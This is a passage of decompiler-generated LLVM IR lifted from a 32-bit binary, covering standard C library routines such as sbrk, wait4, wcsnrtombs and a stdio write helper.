  %v6_8051b0f = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp5)
  store i32 %v6_8051b0f, i32* %ebx.global-to-local, align 4
  %tmp11 = icmp ult i32 %v6_8051b0f, -4095
  br i1 %tmp11, label %dec_label_pc_8051b28, label %dec_label_pc_8051b1c

dec_label_pc_8051b1c:                             ; preds = %entry
  %v0_8051b1c = load i32, i32* %stack_var_-4, align 4
  %v1_8051b1c = call i32 @__errno_location(i32 %v0_8051b1c)
  %v0_8051b21 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051b21 = sub i32 0, %v0_8051b21
  %v2_8051b23 = inttoptr i32 %v1_8051b1c to i32*
  store i32 %v1_8051b21, i32* %v2_8051b23, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051b28

dec_label_pc_8051b28:                             ; preds = %entry, %dec_label_pc_8051b1c
  %v0_8051b28 = phi i32 [ %v6_8051b0f, %entry ], [ -1, %dec_label_pc_8051b1c ]
  %v2_8051b2c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051b2c, i32* @ebx, align 4
  ret i32 %v0_8051b28

; uselistorder directives
  uselistorder i32 %v6_8051b0f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051b28, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8051b31 = load i32, i32* @ebx, align 4
  %v0_8051b35 = load i32, i32* @global_var_805fd84.268, align 4
  %v1_8051b35 = icmp eq i32 %v0_8051b35, 0
  %v1_8051b40 = icmp eq i1 %v1_8051b35, false
  br i1 %v1_8051b40, label %dec_label_pc_8051b53, label %dec_label_pc_8051b42

dec_label_pc_8051b42:                             ; preds = %entry
  %v1_8051b47 = call i32 @__GI_brk(i32 0)
  %v2_8051b4f = icmp slt i32 %v1_8051b47, 0
  br i1 %v2_8051b4f, label %dec_label_pc_8051b75, label %dec_label_pc_8051b42.dec_label_pc_8051b53_crit_edge

dec_label_pc_8051b42.dec_label_pc_8051b53_crit_edge: ; preds = %dec_label_pc_8051b42
  %v0_8051b55.pre = load i32, i32* @global_var_805fd84.268, align 4
  br label %dec_label_pc_8051b53

dec_label_pc_8051b53:                             ; preds = %dec_label_pc_8051b42.dec_label_pc_8051b53_crit_edge, %entry
  %v0_8051b63 = phi i32 [ %v0_8051b55.pre, %dec_label_pc_8051b42.dec_label_pc_8051b53_crit_edge ], [ %v0_8051b35, %entry ]
  %v1_8051b53 = icmp eq i32 %arg1, 0
  %v1_8051b5a = icmp eq i1 %v1_8051b53, false
  br i1 %v1_8051b5a, label %dec_label_pc_8051b60, label %dec_label_pc_8051b5c

dec_label_pc_8051b5c:                             ; preds = %dec_label_pc_8051b53
  br label %dec_label_pc_8051b78

dec_label_pc_8051b60:                             ; preds = %dec_label_pc_8051b53
  store i32 %v0_8051b63, i32* @ebx, align 4
  %v2_8051b65 = add i32 %v0_8051b63, %arg1
  %v1_8051b69 = call i32 @__GI_brk(i32 %v2_8051b65)
  %v2_8051b71 = icmp slt i32 %v1_8051b69, 0
  %v1_8051b73 = icmp eq i1 %v2_8051b71, false
  br i1 %v1_8051b73, label %dec_label_pc_8051b60.dec_label_pc_8051b78_crit_edge, label %dec_label_pc_8051b75

dec_label_pc_8051b60.dec_label_pc_8051b78_crit_edge: ; preds = %dec_label_pc_8051b60
  %v0_8051b78.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051b78

dec_label_pc_8051b75:                             ; preds = %dec_label_pc_8051b60, %dec_label_pc_8051b42
  br label %dec_label_pc_8051b78

dec_label_pc_8051b78:                             ; preds = %dec_label_pc_8051b60.dec_label_pc_8051b78_crit_edge, %dec_label_pc_8051b5c, %dec_label_pc_8051b75
  %v0_8051b78 = phi i32 [ %v0_8051b78.pre, %dec_label_pc_8051b60.dec_label_pc_8051b78_crit_edge ], [ %v0_8051b63, %dec_label_pc_8051b5c ], [ -1, %dec_label_pc_8051b75 ]
  %v2_8051b7a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051b7a, i32* @edx, align 4
  store i32 %v0_8051b31, i32* @ebx, align 4
  ret i32 %v0_8051b78

; uselistorder directives
  uselistorder i32 %v0_8051b63, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_8051b78, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8051b80 = load i32, i32* @edi, align 4
  %v0_8051b81 = load i32, i32* @esi, align 4
  store i32 %v0_8051b81, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_8051b95 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8051b9d = call i32 @wait4(i32 %v0_8051b95, i32 %v0_8051b81, i32 %v0_8051b80, i32 %tmp5)
  store i32 %v0_8051b95, i32* @ebx, align 4
  store i32 %v4_8051b9d, i32* %esi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_8051b9d, -4095
  br i1 %tmp10, label %dec_label_pc_8051bb5, label %dec_label_pc_8051ba9

dec_label_pc_8051ba9:                             ; preds = %entry
  %v1_8051ba9 = call i32 @__errno_location(i32 %v0_8051b95)
  %v0_8051bae = load i32, i32* %esi.global-to-local, align 4
  %v1_8051bae = sub i32 0, %v0_8051bae
  %v2_8051bb0 = inttoptr i32 %v1_8051ba9 to i32*
  store i32 %v1_8051bae, i32* %v2_8051bb0, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051bb5

dec_label_pc_8051bb5:                             ; preds = %entry, %dec_label_pc_8051ba9
  %v0_8051bb5 = phi i32 [ %v4_8051b9d, %entry ], [ -1, %dec_label_pc_8051ba9 ]
  %v2_8051bb8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051bb8, i32* @esi, align 4
  store i32 %v0_8051b80, i32* @edi, align 4
  ret i32 %v0_8051bb5

; uselistorder directives
  uselistorder i32 %v4_8051b9d, { 1, 0, 2 }
  uselistorder i32 %v0_8051b95, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 1, 0 }
  uselistorder label %dec_label_pc_8051bb5, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_805fd64.269 to i32)
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_8051bcf = icmp eq i32 %tmp5, 0
  %v1_8051bd1 = icmp eq i1 %v1_8051bcf, false
  br i1 %v1_8051bd1, label %dec_label_pc_8051bd9, label %dec_label_pc_8051bd3

dec_label_pc_8051bd3:                             ; preds = %entry
  %v2_8051bd3 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_8051bd9

dec_label_pc_8051bd9:                             ; preds = %entry, %dec_label_pc_8051bd3
  %v0_8051bf5 = phi i32 [ %tmp5, %entry ], [ %v2_8051bd3, %dec_label_pc_8051bd3 ]
  %v0_8051bdd = phi i32 [ %tmp4, %entry ], [ 0, %dec_label_pc_8051bd3 ]
  %v2_8051bd9 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v0_8051bdd, i32* %stack_var_-4, align 4
  store i32 %v2_8051bd9, i32* %stack_var_-8, align 4
  %v2_8051bf0 = ptrtoint i32* %stack_var_-8 to i32
  %v5_8051bf6 = inttoptr i32 %v0_8051bf5 to i8*
  %v6_8051bf6 = call i32 @__GI_wcsnrtombs(i8* %v5_8051bf6, i32 %v2_8051bf0, i32 1, i32 16, i32 %tmp)
  %v1_8051bfe = icmp eq i32 %v6_8051bf6, 0
  %v1_8051c00 = icmp eq i1 %v1_8051bfe, false
  br i1 %v1_8051c00, label %dec_label_pc_8051c04, label %dec_label_pc_8051c02

dec_label_pc_8051c02:                             ; preds = %dec_label_pc_8051bd9
  %v1_8051c02 = and i32 %v6_8051bf6, -256
  %v2_8051c02 = or i32 %v1_8051c02, 1
  br label %dec_label_pc_8051c04

dec_label_pc_8051c04:                             ; preds = %dec_label_pc_8051bd9, %dec_label_pc_8051c02
  %v0_8051c07 = phi i32 [ %v6_8051bf6, %dec_label_pc_8051bd9 ], [ %v2_8051c02, %dec_label_pc_8051c02 ]
  ret i32 %v0_8051c07

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_8051c04, { 1, 0 }
  uselistorder label %dec_label_pc_8051bd9, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_8051c1d = inttoptr i32 %tmp to i8*
  %v6_8051c1d = call i32 @__GI_wcsnrtombs(i8* %v5_8051c1d, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_8051c1d
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8051c2b = load i32, i32* @ebx, align 4
  %v4_8051c2f = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051c2f, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  %v1_8051c3b = icmp eq i8* %arg1, null
  br i1 %v1_8051c3b, label %dec_label_pc_8051c6f.thread, label %dec_label_pc_8051c3f

dec_label_pc_8051c3f:                             ; preds = %entry
  store i32 1, i32* %edi.global-to-local, align 4
  %v12_8051c44 = icmp eq i32 %v4_8051c2f, %arg2
  %v1_8051c46 = icmp eq i1 %v12_8051c44, false
  br i1 %v1_8051c46, label %dec_label_pc_8051c6f, label %dec_label_pc_8051c69

dec_label_pc_8051c6f.thread:                      ; preds = %entry
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8051c4c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051c4c, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051c79

dec_label_pc_8051c55:                             ; preds = %dec_label_pc_8051c80
  %v1_8051c55 = call i32 @__errno_location(i32 %v0_8051c2b)
  store i32 %v1_8051c55, i32* %eax.global-to-local, align 4
  %v1_8051c5a = inttoptr i32 %v1_8051c55 to i32*
  store i32 84, i32* %v1_8051c5a, align 4
  br label %dec_label_pc_8051ca6

dec_label_pc_8051c65:                             ; preds = %dec_label_pc_8051c87
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_8051c9b.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051c97

dec_label_pc_8051c69:                             ; preds = %dec_label_pc_8051c3f
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8051c6b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051c6b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051c6f

dec_label_pc_8051c6f:                             ; preds = %dec_label_pc_8051c3f, %dec_label_pc_8051c69
  %v2_8051c8715 = phi i32 [ %v4_8051c2f, %dec_label_pc_8051c3f ], [ %v2_8051c6b, %dec_label_pc_8051c69 ]
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %tmp33 = icmp ult i32 %arg4, %arg3
  br i1 %tmp33, label %dec_label_pc_8051c77, label %dec_label_pc_8051c79

dec_label_pc_8051c77:                             ; preds = %dec_label_pc_8051c6f
  store i32 %arg4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051c79

dec_label_pc_8051c79:                             ; preds = %dec_label_pc_8051c6f.thread, %dec_label_pc_8051c6f, %dec_label_pc_8051c77
  %v2_8051c871532 = phi i32 [ %v2_8051c8715, %dec_label_pc_8051c6f ], [ %v2_8051c8715, %dec_label_pc_8051c77 ], [ %v2_8051c4c, %dec_label_pc_8051c6f.thread ]
  %v0_8051c7c = phi i32 [ %arg3, %dec_label_pc_8051c6f ], [ %arg4, %dec_label_pc_8051c77 ], [ %arg3, %dec_label_pc_8051c6f.thread ]
  %v1_8051c79 = inttoptr i32 %arg2 to i32*
  %v2_8051c79 = load i32, i32* %v1_8051c79, align 4
  store i32 %v2_8051c79, i32* %esi.global-to-local, align 4
  store i32 %v0_8051c7c, i32* @ecx, align 4
  %v1_8051c933 = icmp eq i32 %v0_8051c7c, 0
  %v1_8051c9510 = icmp eq i1 %v1_8051c933, false
  br i1 %v1_8051c9510, label %dec_label_pc_8051c80, label %dec_label_pc_8051c97

dec_label_pc_8051c80:                             ; preds = %dec_label_pc_8051c79, %dec_label_pc_8051c8d
  %v2_8051c87 = phi i32 [ %v2_8051c90, %dec_label_pc_8051c8d ], [ %v2_8051c871532, %dec_label_pc_8051c79 ]
  %v0_8051c80 = phi i32 [ %v1_8051c8d, %dec_label_pc_8051c8d ], [ %v2_8051c79, %dec_label_pc_8051c79 ]
  %v1_8051c80 = inttoptr i32 %v0_8051c80 to i32*
  %v2_8051c80 = load i32, i32* %v1_8051c80, align 4
  store i32 %v2_8051c80, i32* %eax.global-to-local, align 4
  %v6_8051c85 = icmp ugt i32 %v2_8051c80, 127
  br i1 %v6_8051c85, label %dec_label_pc_8051c55, label %dec_label_pc_8051c87

dec_label_pc_8051c87:                             ; preds = %dec_label_pc_8051c80
  %v1_8051c87 = trunc i32 %v2_8051c80 to i8
  %v3_8051c87 = inttoptr i32 %v2_8051c87 to i8*
  store i8 %v1_8051c87, i8* %v3_8051c87, align 1
  %v0_8051c89 = load i32, i32* %eax.global-to-local, align 4
  %v3_8051c89 = trunc i32 %v0_8051c89 to i8
  %v4_8051c89 = icmp eq i8 %v3_8051c89, 0
  br i1 %v4_8051c89, label %dec_label_pc_8051c65, label %dec_label_pc_8051c8d

dec_label_pc_8051c8d:                             ; preds = %dec_label_pc_8051c87
  %v0_8051c8d = load i32, i32* %esi.global-to-local, align 4
  %v1_8051c8d = add i32 %v0_8051c8d, 4
  store i32 %v1_8051c8d, i32* %esi.global-to-local, align 4
  %v0_8051c90 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051c90 = load i32, i32* %edi.global-to-local, align 4
  %v2_8051c90 = add i32 %v1_8051c90, %v0_8051c90
  store i32 %v2_8051c90, i32* %edx.global-to-local, align 4
  %v0_8051c92 = load i32, i32* @ecx, align 4
  %v1_8051c92 = add i32 %v0_8051c92, -1
  %v8_8051c92 = icmp eq i32 %v1_8051c92, 0
  store i32 %v1_8051c92, i32* @ecx, align 4
  %v1_8051c95 = icmp eq i1 %v8_8051c92, false
  br i1 %v1_8051c95, label %dec_label_pc_8051c80, label %dec_label_pc_8051c97

dec_label_pc_8051c97:                             ; preds = %dec_label_pc_8051c8d, %dec_label_pc_8051c79, %dec_label_pc_8051c65
  %v0_8051c9f = phi i32 [ 0, %dec_label_pc_8051c65 ], [ %v2_8051c79, %dec_label_pc_8051c79 ], [ %v1_8051c8d, %dec_label_pc_8051c8d ]
  %v0_8051c9b = phi i32 [ %v0_8051c9b.pre, %dec_label_pc_8051c65 ], [ %v2_8051c871532, %dec_label_pc_8051c79 ], [ %v2_8051c90, %dec_label_pc_8051c8d ]
  %v2_8051c97 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051c97, i32* %eax.global-to-local, align 4
  %v12_8051c9b = icmp eq i32 %v0_8051c9b, %v2_8051c97
  br i1 %v12_8051c9b, label %dec_label_pc_8051ca2, label %dec_label_pc_8051c9f

dec_label_pc_8051c9f:                             ; preds = %dec_label_pc_8051c97
  %v1_8051c9f = load i32, i32* %ebp.global-to-local, align 4
  %v2_8051c9f = inttoptr i32 %v1_8051c9f to i32*
  store i32 %v0_8051c9f, i32* %v2_8051c9f, align 4
  br label %dec_label_pc_8051ca2

dec_label_pc_8051ca2:                             ; preds = %dec_label_pc_8051c97, %dec_label_pc_8051c9f
  %v0_8051ca2 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8051ca2, i32* %eax.global-to-local, align 4
  %v1_8051ca4 = load i32, i32* @ecx, align 4
  %v2_8051ca4 = sub i32 %v0_8051ca2, %v1_8051ca4
  br label %dec_label_pc_8051ca6

dec_label_pc_8051ca6:                             ; preds = %dec_label_pc_8051c55, %dec_label_pc_8051ca2
  %storemerge1 = phi i32 [ %v2_8051ca4, %dec_label_pc_8051ca2 ], [ -1, %dec_label_pc_8051c55 ]
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  store i32 %v0_8051c2b, i32* @ebx, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v2_8051c90, { 0, 2, 1 }
  uselistorder i32 %v1_8051c8d, { 0, 2, 1 }
  uselistorder i32 %v2_8051c79, { 1, 0, 2 }
  uselistorder i32 %v0_8051c7c, { 1, 0 }
  uselistorder i32 %v2_8051c871532, { 1, 0 }
  uselistorder i32 %v4_8051c2f, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 6, 5, 7 }
  uselistorder i32 127, { 1, 0, 4, 2, 5, 3 }
  uselistorder i32 %arg4, { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 1, 3, 4, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051ca6, { 1, 0 }
  uselistorder label %dec_label_pc_8051ca2, { 1, 0 }
  uselistorder label %dec_label_pc_8051c80, { 1, 0 }
  uselistorder label %dec_label_pc_8051c79, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051c6f, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8051cb1 = load i32, i32* @edi, align 4
  %v0_8051cb3 = load i32, i32* @ebx, align 4
  %v4_8051cb7 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051cb7, i32* @edi, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_8051cc34 = icmp eq i32 %arg3, 0
  br i1 %v1_8051cc34, label %dec_label_pc_8051d22, label %dec_label_pc_8051cc8.lr.ph

dec_label_pc_8051cc8.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8051cc8

dec_label_pc_8051cc8:                             ; preds = %dec_label_pc_8051ce7.dec_label_pc_8051cc8_crit_edge, %dec_label_pc_8051cc8.lr.ph
  %v0_8051cd8 = phi i32 [ %v4_8051cb7, %dec_label_pc_8051cc8.lr.ph ], [ %v0_8051cd8.pre, %dec_label_pc_8051ce7.dec_label_pc_8051cc8_crit_edge ]
  %v0_8051cd7 = phi i32 [ %arg2, %dec_label_pc_8051cc8.lr.ph ], [ %v2_8051ce9, %dec_label_pc_8051ce7.dec_label_pc_8051cc8_crit_edge ]
  %v0_8051cca.in = phi i32 [ %arg3, %dec_label_pc_8051cc8.lr.ph ], [ %v2_8051ce7, %dec_label_pc_8051ce7.dec_label_pc_8051cc8_crit_edge ]
  %v0_8051cca = icmp slt i32 %v0_8051cca.in, 0
  store i32 %v0_8051cca.in, i32* %ebp.global-to-local, align 4
  %v2_8051cca = icmp eq i1 %v0_8051cca, false
  %storemerge = select i1 %v2_8051cca, i32 %v0_8051cca.in, i32 2147483647
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8051cd8 = add i32 %v0_8051cd8, 4
  %v2_8051cd8 = inttoptr i32 %v1_8051cd8 to i32*
  %v3_8051cd8 = load i32, i32* %v2_8051cd8, align 4
  %tmp36 = inttoptr i32 %v0_8051cd7 to i32*
  %v5_8051cdb = call i32 @__libc_write(i32 %v3_8051cd8, i32* %tmp36, i32 %storemerge)
  store i32 %v5_8051cdb, i32* %eax.global-to-local, align 4
  %v2_8051ce3 = icmp slt i32 %v5_8051cdb, 0
  br i1 %v2_8051ce3, label %dec_label_pc_8051ced, label %dec_label_pc_8051ce7

dec_label_pc_8051ce7:                             ; preds = %dec_label_pc_8051cc8
  %v0_8051ce7 = load i32, i32* @ebx, align 4
  %v2_8051ce7 = sub i32 %v0_8051ce7, %v5_8051cdb
  %v12_8051ce7 = icmp eq i32 %v2_8051ce7, 0
  store i32 %v2_8051ce7, i32* @ebx, align 4
  %v0_8051ce9 = load i32, i32* %esi.global-to-local, align 4
  %v2_8051ce9 = add i32 %v0_8051ce9, %v5_8051cdb
  store i32 %v2_8051ce9, i32* %esi.global-to-local, align 4
  br i1 %v12_8051ce7, label %dec_label_pc_8051d22, label %dec_label_pc_8051ce7.dec_label_pc_8051cc8_crit_edge

dec_label_pc_8051ce7.dec_label_pc_8051cc8_crit_edge: ; preds = %dec_label_pc_8051ce7
  %v0_8051cd8.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051cc8

dec_label_pc_8051ced:                             ; preds = %dec_label_pc_8051cc8
  %v0_8051ced = load i32, i32* @edi, align 4
  %v1_8051ced = add i32 %v0_8051ced, 8
  %v2_8051ced = inttoptr i32 %v1_8051ced to i32*
  %v3_8051ced = load i32, i32* %v2_8051ced, align 4
  store i32 %v3_8051ced, i32* @edx, align 4
  %v1_8051cf0 = add i32 %v0_8051ced, 12
  %v2_8051cf0 = inttoptr i32 %v1_8051cf0 to i32*
  %v3_8051cf0 = load i32, i32* %v2_8051cf0, align 4
  store i32 %v3_8051cf0, i32* %eax.global-to-local, align 4
  %v1_8051cf3 = inttoptr i32 %v0_8051ced to i16*
  %v2_8051cf3 = load i16, i16* %v1_8051cf3, align 2
  %v3_8051cf3 = or i16 %v2_8051cf3, 8
  store i16 %v3_8051cf3, i16* %v1_8051cf3, align 2
  %v0_8051cf7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051cf7 = load i32, i32* @edx, align 4
  %v2_8051cf7 = sub i32 %v0_8051cf7, %v1_8051cf7
  %v12_8051cf7 = icmp eq i32 %v2_8051cf7, 0
  store i32 %v2_8051cf7, i32* %eax.global-to-local, align 4
  %v4_8051d1e.pre = load i32, i32* @ebx, align 4
  br i1 %v12_8051cf7, label %dec_label_pc_8051d1e, label %dec_label_pc_8051cfb

dec_label_pc_8051cfb:                             ; preds = %dec_label_pc_8051ced
  %v6_8051cfd = icmp ugt i32 %v2_8051cf7, %v4_8051d1e.pre
  br i1 %v6_8051cfd, label %dec_label_pc_8051d01.preheader, label %dec_label_pc_8051cff

dec_label_pc_8051cff:                             ; preds = %dec_label_pc_8051cfb
  store i32 %v2_8051cf7, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051d01.preheader

dec_label_pc_8051d01.preheader:                   ; preds = %dec_label_pc_8051cff, %dec_label_pc_8051cfb
  %v0_8051d01.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051d01

dec_label_pc_8051d01:                             ; preds = %dec_label_pc_8051d01.preheader, %dec_label_pc_8051d13
  %v2_8051d03 = phi i32 [ %v1_8051cf7, %dec_label_pc_8051d01.preheader ], [ %v1_8051d0f, %dec_label_pc_8051d13 ]
  %v4_8051d01 = phi i32 [ %v2_8051cf7, %dec_label_pc_8051d01.preheader ], [ %v0_8051d05, %dec_label_pc_8051d13 ]
  %v0_8051d01 = phi i32 [ %v0_8051d01.pre, %dec_label_pc_8051d01.preheader ], [ %v1_8051d13, %dec_label_pc_8051d13 ]
  %v1_8051d01 = inttoptr i32 %v0_8051d01 to i8*
  %v2_8051d01 = load i8, i8* %v1_8051d01, align 1
  %v3_8051d01 = zext i8 %v2_8051d01 to i32
  %v5_8051d01 = and i32 %v4_8051d01, -256
  %v6_8051d01 = or i32 %v3_8051d01, %v5_8051d01
  store i32 %v6_8051d01, i32* %eax.global-to-local, align 4
  %v3_8051d03 = inttoptr i32 %v2_8051d03 to i8*
  store i8 %v2_8051d01, i8* %v3_8051d03, align 1
  %v0_8051d05 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051d05 = trunc i32 %v0_8051d05 to i8
  %v10_8051d05 = icmp eq i8 %v1_8051d05, 10
  %v1_8051d07 = icmp eq i1 %v10_8051d05, false
  br i1 %v1_8051d07, label %dec_label_pc_8051d0f, label %dec_label_pc_8051d09

dec_label_pc_8051d09:                             ; preds = %dec_label_pc_8051d01
  %v0_8051d09 = load i32, i32* @edi, align 4
  %v1_8051d09 = add i32 %v0_8051d09, 1
  %v2_8051d09 = inttoptr i32 %v1_8051d09 to i8*
  %v3_8051d09 = load i8, i8* %v2_8051d09, align 1
  %v4_8051d09 = urem i8 %v3_8051d09, 2
  %v5_8051d09 = icmp eq i8 %v4_8051d09, 0
  %v1_8051d0d = icmp eq i1 %v5_8051d09, false
  br i1 %v1_8051d0d, label %dec_label_pc_8051d09.dec_label_pc_8051d16_crit_edge, label %dec_label_pc_8051d0f

dec_label_pc_8051d09.dec_label_pc_8051d16_crit_edge: ; preds = %dec_label_pc_8051d09
  %v0_8051d16.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051d16

dec_label_pc_8051d0f:                             ; preds = %dec_label_pc_8051d09, %dec_label_pc_8051d01
  %v0_8051d0f = load i32, i32* @edx, align 4
  %v1_8051d0f = add i32 %v0_8051d0f, 1
  store i32 %v1_8051d0f, i32* @edx, align 4
  %v0_8051d10 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051d10 = add i32 %v0_8051d10, -1
  %v8_8051d10 = icmp eq i32 %v1_8051d10, 0
  store i32 %v1_8051d10, i32* %ebp.global-to-local, align 4
  br i1 %v8_8051d10, label %dec_label_pc_8051d0f.dec_label_pc_8051d16_crit_edge, label %dec_label_pc_8051d13

dec_label_pc_8051d0f.dec_label_pc_8051d16_crit_edge: ; preds = %dec_label_pc_8051d0f
  %v1_8051d16.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051d16

dec_label_pc_8051d13:                             ; preds = %dec_label_pc_8051d0f
  %v0_8051d13 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051d13 = add i32 %v0_8051d13, 1
  store i32 %v1_8051d13, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051d01

dec_label_pc_8051d16:                             ; preds = %dec_label_pc_8051d0f.dec_label_pc_8051d16_crit_edge, %dec_label_pc_8051d09.dec_label_pc_8051d16_crit_edge
  %v1_8051d16 = phi i32 [ %v0_8051d09, %dec_label_pc_8051d09.dec_label_pc_8051d16_crit_edge ], [ %v1_8051d16.pre, %dec_label_pc_8051d0f.dec_label_pc_8051d16_crit_edge ]
  %v0_8051d16 = phi i32 [ %v0_8051d16.pre, %dec_label_pc_8051d09.dec_label_pc_8051d16_crit_edge ], [ %v1_8051d0f, %dec_label_pc_8051d0f.dec_label_pc_8051d16_crit_edge ]
  %v2_8051d16 = add i32 %v1_8051d16, 16
  %v3_8051d16 = inttoptr i32 %v2_8051d16 to i32*
  store i32 %v0_8051d16, i32* %v3_8051d16, align 4
  %v0_8051d19 = load i32, i32* @edx, align 4
  %v1_8051d19 = load i32, i32* @edi, align 4
  %v2_8051d19 = add i32 %v1_8051d19, 8
  %v3_8051d19 = inttoptr i32 %v2_8051d19 to i32*
  %v4_8051d19 = load i32, i32* %v3_8051d19, align 4
  %v5_8051d19 = sub i32 %v0_8051d19, %v4_8051d19
  store i32 %v5_8051d19, i32* @edx, align 4
  %v0_8051d1c = load i32, i32* @ebx, align 4
  %v2_8051d1c = sub i32 %v0_8051d1c, %v5_8051d19
  br label %dec_label_pc_8051d1e

dec_label_pc_8051d1e:                             ; preds = %dec_label_pc_8051ced, %dec_label_pc_8051d16
  %v4_8051d1e = phi i32 [ %v2_8051d1c, %dec_label_pc_8051d16 ], [ %v4_8051d1e.pre, %dec_label_pc_8051ced ]
  %v5_8051d1e = sub i32 %arg3, %v4_8051d1e
  br label %dec_label_pc_8051d22

dec_label_pc_8051d22:                             ; preds = %dec_label_pc_8051ce7, %entry, %dec_label_pc_8051d1e
  %stack_var_12.0 = phi i32 [ %v5_8051d1e, %dec_label_pc_8051d1e ], [ 0, %entry ], [ %arg3, %dec_label_pc_8051ce7 ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  store i32 %v0_8051cb3, i32* @ebx, align 4
  store i32 %v0_8051cb1, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
